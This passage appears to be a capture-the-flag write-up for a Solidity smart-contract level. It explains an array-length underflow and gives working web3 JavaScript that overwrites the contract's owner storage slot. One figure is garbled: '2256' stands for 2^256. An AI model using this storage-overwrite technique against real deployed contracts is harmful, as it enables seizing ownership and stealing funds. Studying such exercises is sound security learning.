### Analysis
To finish the level we need to do the following steps:

1) Call the make_contact() function so that the contact is set to true. This will allow us to go through the contacted() modifier.
2) Call the retract() function. This will decrease the codex.length by 1. And what happens when you subtract 1 from 0 (initial array position)? You get an underflow. This will change the codex.length to be 2256 which is also the total storage capacity of the contract. This will now allow us access to any variables stored in the contract.
3) Call the revise() function to access the array at slot 0 and update the value of the _owner with our own address. The index i can be calculated as shown in the slot table above.


### The Exploit

Run the code in Developer Tools:
~~~
p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]))
i = BigInt(2 ** 256) - BigInt(p)
content = '0x' + '0'.repeat(24) + player.slice(2)
await contract.revise(i, content)
await contract.owner() === player // Output: true
~~~